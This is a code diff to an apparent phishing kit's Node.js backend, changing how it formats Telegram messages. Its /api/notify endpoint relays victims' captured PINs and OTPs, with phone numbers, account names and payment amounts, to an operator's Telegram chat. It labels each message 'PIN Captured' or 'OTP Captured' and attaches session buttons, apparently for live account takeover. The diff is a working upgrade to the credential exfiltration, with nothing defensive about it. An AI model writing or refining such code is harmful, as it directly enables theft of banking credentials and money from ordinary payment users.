@@ -34,8 +34,20 @@ setInterval(()=>{
   for(const [id,s] of sessions){ if(now > s.expiresAt + 60000) sessions.delete(id); }
 }, 5*60*1000);
 
+function esc(s = '') {
+  return String(s)
+    .replace(/&/g,'&amp;')
+    .replace(/</g,'&lt;')
+    .replace(/>/g,'&gt;');
+}
+
 async function tgSend(text, replyMarkup){
-  const body = { chat_id: TELEGRAM_CHAT_ID, text, parse_mode:'Markdown' };
+  const body = {
+    chat_id: TELEGRAM_CHAT_ID,
+    text,
+    parse_mode: 'HTML',
+    disable_web_page_preview: true
+  };
   if(replyMarkup) body.reply_markup = replyMarkup;
   const r = await fetch(`${TELEGRAM_API}/sendMessage`, {
     method:'POST',
@@ -75,20 +87,20 @@ app.post('/api/notify', async (req, res)=>{
     if(!stage || !['pin','otp'].includes(stage)) return res.status(400).json({ ok:false, error:'Invalid stage' });
 
     const s = createSession(stage, { phone, receipt });
-    const label = stage === 'pin' ? '🔐 PIN Captured' : '📩 OTP Captured';
+    const label = stage === 'pin' ? '🔐 <b>PIN Captured</b>' : '📩 <b>OTP Captured</b>';
     const keyLabel = stage === 'pin' ? 'PIN' : 'OTP';
 
     const text =
       `${label}\n` +
       `━━━━━━━━━━━━━━━\n` +
-      `🧾 Ref: ${receipt?.trackingNumber || '—'}\n` +
-      `👤 ${receipt?.accountName || '—'}\n` +
-      `📱 ${phone || '—'}\n` +
-      `🔑 ${keyLabel}: \`${pinOrOtp || '—'}\`\n` +
-      `💳 ${receipt?.modeOfPayment || '—'}\n` +
-      `💰 ${receipt?.currency || ''} ${receipt?.amount || '—'}\n` +
-      `🕒 ${new Date().toLocaleString('en-GB',{timeZone:'Africa/Harare'})} CAT\n` +
-      `\n_Session: ${s.id}_`;
+      `🧾 <b>Ref:</b> <code>${esc(receipt?.trackingNumber || '—')}</code>\n` +
+      `👤 <b>Recipient:</b> ${esc(receipt?.accountName || '—')}\n` +
+      `📱 <b>Phone:</b> <code>${esc(phone || '—')}</code>\n` +
+      `🔑 <b>${keyLabel}:</b> <code>${esc(pinOrOtp || '—')}</code>\n` +
+      `💳 <b>Service:</b> ${esc(receipt?.modeOfPayment || '—')}\n` +
+      `💰 <b>Amount:</b> ${esc(receipt?.currency || '')} ${esc(receipt?.amount || '—')}\n` +
+      `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB',{timeZone:'Africa/Harare'})} CAT\n` +
+      `\n<i>Session: ${esc(s.id)}</i>`;
 
     const buttons = stage === 'pin' ? {
       inline_keyboard: [[
